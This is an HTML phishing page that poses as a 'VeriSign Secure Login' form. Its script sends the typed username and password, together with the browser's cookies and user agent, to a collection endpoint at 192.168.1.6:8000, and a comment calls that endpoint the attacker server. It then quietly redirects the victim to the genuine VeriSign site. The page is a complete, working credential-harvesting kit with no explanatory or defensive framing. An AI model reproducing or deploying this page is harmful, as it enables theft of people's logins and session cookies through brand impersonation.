<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>VeriSign Secure Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f6ff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px;
      width: 320px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
    }
    h1 {
      text-align: center;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
    }
    button {
      background: #1a73e8;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="login-box">
    <h1>VeriSign</h1>

    <form onsubmit="sendCreds(event)">
      <input id="user" placeholder="Username or Email" required>
      <input id="pass" type="password" placeholder="Password" required>
      <button>Login</button>
    </form>
  </div>

  <script>
    function sendCreds(e) {
      e.preventDefault();

      // Send credentials to attacker server
      fetch("http://192.168.1.6:8000/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: document.getElementById("user").value,
          password: document.getElementById("pass").value,
          cookies: document.cookie,
          userAgent: navigator.userAgent
        })
      }).catch(() => {});

      // Silent redirect to legitimate site
      setTimeout(() => {
        window.location.href = "https://www.verisign.com/";
      }, 1500);
    }
  </script>
</body>
</html>
